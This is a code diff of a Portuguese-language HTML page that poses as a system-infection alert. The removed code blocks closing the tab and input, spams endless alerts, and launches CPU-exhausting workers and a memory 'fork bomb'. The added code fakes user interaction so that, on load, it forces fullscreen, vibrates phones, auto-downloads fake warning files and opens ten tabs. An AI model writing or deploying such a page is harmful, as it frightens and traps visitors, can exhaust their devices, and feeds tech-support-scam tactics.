@@ -2,37 +2,49 @@
 <html lang="pt-BR">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>SISTEMA CORROMPIDO</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
+    <title>SISTEMA INFECTADO</title>
     <style>
         body {
             margin: 0;
             overflow: hidden;
             background: black;
-            color: #ff0000;
+            color: red;
             font-family: monospace;
-            font-size: 36px;
-            text-align: center;
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            z-index: 9999;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
             user-select: none;
-            cursor: none;
+            touch-action: none;
         }
         #message {
-            position: absolute;
-            top: 50%;
-            left: 50%;
-            transform: translate(-50%, -50%);
-            animation: panic 0.2s infinite;
+            font-size: 8vw;
+            text-align: center;
+            animation: blink 0.3s infinite, colorChange 2s infinite, shadowPulse 1s infinite;
+            text-shadow: 0 0 3vw red;
+            z-index: 10;
+            padding: 2vw;
         }
-        @keyframes panic {
-            0% { color: #ff0000; transform: translate(-50%, -50%) scale(1); }
-            50% { color: #00ff00; transform: translate(-50%, -50%) scale(1.2); }
-            100% { color: #ff0000; transform: translate(-50%, -50%) scale(1); }
+        #counter {
+            font-size: 4vw;
+            color: #ff4040;
+            position: fixed;
+            top: 10vw;
+            z-index: 10;
+        }
+        @keyframes blink {
+            50% { opacity: 0; }
+        }
+        @keyframes colorChange {
+            0% { color: red; }
+            50% { color: #ff4040; }
+            100% { color: red; }
+        }
+        @keyframes shadowPulse {
+            0% { text-shadow: 0 0 3vw red; }
+            50% { text-shadow: 0 0 5vw red; }
+            100% { text-shadow: 0 0 3vw red; }
         }
         canvas {
             position: fixed;
@@ -40,95 +52,175 @@
             left: 0;
             width: 100%;
             height: 100%;
-            z-index: -1;
+            z-index: 0;
         }
     </style>
 </head>
 <body>
-    <div id="message">⚠️ SISTEMA CORROMPIDO! NÃO TENTE SAIR! ⚠️</div>
+    <div id="message">SISTEMA INFECTADO! ARQUIVOS SENDO INSTALADOS!</div>
+    <div id="counter">Arquivos baixados: 0/5</div>
     <canvas id="glitch"></canvas>
-    <audio id="siren1" loop><source src="https://www.soundjay.com/alarms/sounds/alarm-01.mp3" type="audio/mpeg"></audio>
-    <audio id="siren2" loop><source src="https://www.soundjay.com/alarms/sounds/alarm-02.mp3" type="audio/mpeg"></audio>
     <script>
-        // Bloquear fechamento da aba
-        window.addEventListener('beforeunload', e => {
+        // Impedir fechamento da aba
+        window.addEventListener('beforeunload', (e) => {
             e.preventDefault();
-            e.returnValue = 'SISTEMA EM COLAPSO! SAIR PODE DANIFICAR O DISPOSITIVO!';
-            window.open(window.location.href, '_blank'); // Tenta reabrir
+            e.returnValue = 'SISTEMA COMPROMETIDO! SAIR PODE CAUSAR DANOS!';
         });
 
-        // Bloquear teclado e mouse
-        document.addEventListener('keydown', e => e.preventDefault());
-        document.addEventListener('contextmenu', e => e.preventDefault());
-        document.addEventListener('click', e => e.preventDefault());
+        // Bloquear interações
+        document.addEventListener('keydown', (e) => e.preventDefault());
+        document.addEventListener('contextmenu', (e) => e.preventDefault());
+        document.addEventListener('touchmove', (e) => e.preventDefault(), { passive: false });
 
-        // Pop-ups agressivos
-        function spamAlerts() {
-            while (true) {
-                alert('⚠️ ERRO CRÍTICO 0xDEAD! DISPOSITIVO COMPROMETIDO!');
+        // Tentar manter o foco na janela
+        window.addEventListener('blur', () => {
+            window.focus();
+        });
+
+        // Tentar tela cheia
+        function requestFullscreen() {
+            const elem = document.documentElement;
+            if (elem.requestFullscreen) {
+                elem.requestFullscreen().catch(() => {});
+            } else if (elem.webkitRequestFullscreen) {
+                elem.webkitRequestFullscreen().catch(() => {});
+            } else if (elem.mozRequestFullScreen) {
+                elem.mozRequestFullScreen().catch(() => {});
+            } else if (elem.msRequestFullscreen) {
+                elem.msRequestFullscreen().catch(() => {});
             }
         }
 
-        // Tocar áudio alto
-        const siren1 = document.getElementById('siren1');
-        const siren2 = document.getElementById('siren2');
-        siren1.volume = 1.0;
-        siren2.volume = 1.0;
-        siren1.play().catch(() => {});
-        siren2.play().catch(() => {});
-
-        // Múltiplos Web Workers para sobrecarga
-        const workerCode = `
-            while (true) {
-                let x = Math.random() * 1000000;
-                for (let i = 0; i < 10000000; i++) {
-                    x = Math.sin(x) + Math.cos(x) + Math.tan(x);
-                }
-            }
-        `;
-        for (let i = 0; i < 10; i++) { // 10 workers
-            const blob = new Blob([workerCode], { type: 'application/javascript' });
-            const worker = new Worker(URL.createObjectURL(blob));
-        }
-
-        // Fork bomb para RAM
-        function forkBomb() {
-            while (true) {
-                let arr = new Array(10000000).fill(Math.random());
-                arr.map(x => x * x * Math.random());
+        // Vibração em dispositivos móveis
+        function startVibration() {
+            if (navigator.vibrate) {
+                setInterval(() => {
+                    navigator.vibrate([50, 50, 50]);
+                }, 600);
             }
         }
-        for (let i = 0; i < 5; i++) { // 5 instâncias
-            setTimeout(forkBomb, 0);
-        }
 
-        // Animação pesada no canvas
+        // Efeito de fundo (glitch)
         const canvas = document.getElementById('glitch');
-        const ctx = canvas.getContext('2d');
         canvas.width = window.innerWidth;
         canvas.height = window.innerHeight;
+        const ctx = canvas.getContext('2d');
         function glitchEffect() {
-            for (let i = 0; i < 5000; i++) { // Mais partículas
+            ctx.clearRect(0, 0, canvas.width, canvas.height);
+            for (let i = 0; i < 50; i++) {
                 ctx.fillStyle = `hsl(${Math.random() * 360}, 100%, 50%)`;
                 ctx.fillRect(
                     Math.random() * canvas.width,
                     Math.random() * canvas.height,
-                    Math.random() * 200,
-                    Math.random() * 200
+                    Math.random() * 40,
+                    Math.random() * 40
                 );
             }
-            ctx.globalAlpha = 0.1;
-            ctx.fillStyle = 'rgba(0,0,0,0.1)';
-            ctx.fillRect(0, 0, canvas.width, canvas.height);
             requestAnimationFrame(glitchEffect);
         }
         glitchEffect();
 
-        // Alterar cursor
-        document.body.style.cursor = 'url("data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsMAAA7DAcdvqGQAAABYSURBVFhH7dcxCoAwEENR+/7PeO8tsYO4gYlQSIiIuODLGZhMljOwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCw8A+4AaT2y7VowAAAABJRU5ErkJggg=="), auto';
+        // Conteúdo personalizável dos arquivos .txt
+        const txtContents = [
+            "ERRO CRÍTICO: Seu dispositivo foi comprometido! Não desligue o sistema.",
+            "AVISO: Arquivos de sistema estão sendo modificados. Qualquer ação pode piorar a situação.",
+            "ALERTA: Dados sensíveis estão sendo expostos. Contate o suporte imediatamente.",
+            "FALHA: Sistema operacional corrompido. Reinicie em modo de segurança.",
+            "PERIGO: Malware detectado. Todos os arquivos estão em risco."
+        ];
 
-        // Spam de alertas imediatos
-        spamAlerts();
+        // Função para criar e baixar arquivos .txt
+        let downloadCount = 0;
+        function downloadTxtFiles() {
+            txtContents.forEach((content, index) => {
+                const delay = 500 * index + Math.random() * 300 - 150; // Atraso base de 500ms ±150ms
+                setTimeout(() => {
+                    try {
+                        const blob = new Blob([content], { type: 'text/plain' });
+                        const url = URL.createObjectURL(blob);
+                        const a = document.createElement('a');
+                        a.href = url;
+                        a.download = `aviso_critico_${index + 1}.txt`;
+                        document.body.appendChild(a);
+                        a.click();
+                        document.body.removeChild(a);
+                        URL.revokeObjectURL(url);
+                        downloadCount++;
+                        document.getElementById('counter').textContent = `Arquivos baixados: ${downloadCount}/5`;
+                    } catch (e) {
+                        console.error('Erro ao baixar arquivo:', e);
+                    }
+                }, delay);
+            });
+        }
+
+        // Função para abrir 10 sites diferentes
+        function openTabs() {
+            const urls = [
+                'https://www.google.com',
+                'https://www.youtube.com',
+                'https://www.wikipedia.org',
+                'https://www.amazon.com',
+                'https://www.reddit.com',
+                'https://www.twitter.com',
+                'https://www.instagram.com',
+                'https://www.linkedin.com',
+                'https://www.netflix.com',
+                'https://www.github.com'
+            ];
+            urls.forEach((url, index) => {
+                const delay = 1000 * index + Math.random() * 500 - 250; // Atraso base de 1000ms ±250ms
+                setTimeout(() => {
+                    try {
+                        const newWindow = window.open(url, '_blank');
+                        if (!newWindow) {
+                            setTimeout(() => window.open(url, '_blank'), 3000);
+                            setTimeout(() => window.open(url, '_blank'), 6000);
+                        }
+                    } catch (e) {
+                        console.error('Erro ao abrir guia:', e);
+                    }
+                }, delay);
+            });
+        }
+
+        // Iniciar ações
+        let hasStarted = false;
+        function startInfection() {
+            if (hasStarted) return;
+            hasStarted = true;
+            downloadTxtFiles();
+            openTabs();
+            requestFullscreen();
+            startVibration();
+            // Retentar downloads após 4s e 8s
+            setTimeout(downloadTxtFiles, 4000);
+            setTimeout(downloadTxtFiles, 8000);
+        }
+
+        // Simular interação para contornar restrições
+        function simulateInteraction() {
+            try {
+                const events = [
+                    new Event('click', { bubbles: true }),
+                    new Event('touchstart', { bubbles: true }),
+                    new Event('mousedown', { bubbles: true })
+                ];
+                events.forEach(event => document.dispatchEvent(event));
+            } catch (e) {
+                console.error('Erro ao simular interação:', e);
+            }
+        }
+
+        // Gatilhos para iniciar
+        document.addEventListener('click', startInfection, { once: true });
+        document.addEventListener('touchstart', startInfection, { once: true });
+
+        // Aguardar carregamento completo
+        window.addEventListener('load', () => {
+            simulateInteraction();
+            setTimeout(startInfection, 500);
+        });
     </script>
 </body>
 </html>
